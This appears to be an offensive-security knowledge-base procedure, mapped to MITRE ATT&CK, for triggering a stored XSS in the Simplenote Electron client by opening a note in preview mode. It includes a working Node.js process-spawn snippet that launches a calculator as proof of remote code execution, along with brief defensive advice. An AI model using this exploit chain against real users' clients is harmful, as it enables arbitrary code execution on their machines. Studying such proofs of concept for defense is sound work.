---
id: proc-trigger-xss-preview
tags:
  - xss
  - rce
  - execution
type: procedure
tools:
  - '[[tools/Process-Monitor-ProcMon]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/Spawn-Process-via-Electron-Process-API-Windows]]'
  - '[[commands/Spawn-Process-via-Electron-Process-API-Linux]]'
verified: false
platforms:
  - Windows
  - Linux
  - Electron
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:36.303Z'
skill_level: beginner
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploitation for Client Execution]]'
---
# Trigger-XSS-by-Previewing-Note

## Summary

This procedure triggers the XSS payload by switching to preview mode in Simplenote, causing the Markdown to render, onerror to fire, external JS to load, and RCE to occur.

## Description

Preview mode uses the vulnerable parser (Showdown) to render HTML, executing the injected JS. The external script then uses Node.js to spawn processes, demonstrating RCE.

## Requirements

1. Malicious note created in Simplenote
2. External JS server running
3. Simplenote client on target platform

## Defense

Defensive measures and detection strategies:

- Isolate renderer processes in Electron with nodeIntegration: false
- Monitor process creation events with tools like ProcMon
- Patch Electron apps to disable dangerous APIs

## Objectives

1. Execute injected JS
2. Load and run external script
3. Spawn arbitrary process

## Instructions

### Step 1: Switch to Preview

**Context**: In Simplenote, select the note and click Preview.

The invalid <img src=x> triggers onerror, evaluating the encoded payload.

> Expected: After a few seconds, process spawns (e.g., netplwiz on Windows).

### Step 2: Verify Execution

**Context**: Use ProcMon to monitor processes.

**Tool** ([[tools/Process-Monitor-ProcMon]]):
Run ProcMon and filter for cmd.exe or netplwiz.

> Expected: New process in user context, confirming RCE.

### Step 3: Linux Variant

**Context**: For Linux, use Linux-specific spawn command.

**Command** ([[commands/Spawn-Process-via-Electron-Process-API-Linux]]):
The loaded JS executes:
```javascript
var Process = process.binding('process_wrap').Process; var proc = new Process(); proc.onexit = function(a,b) {}; var env = process.env; var env_ = []; for (var key in env) env_.push(key+'='+env[key]); proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
```

> Launches gnome-calculator.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques


## Commands Used

- [[commands/Spawn-Process-via-Electron-Process-API-Windows]]
- [[commands/Spawn-Process-via-Electron-Process-API-Linux]]

## Tools Used

- [[tools/Process-Monitor-ProcMon]]

## Tags

- xss
- rce
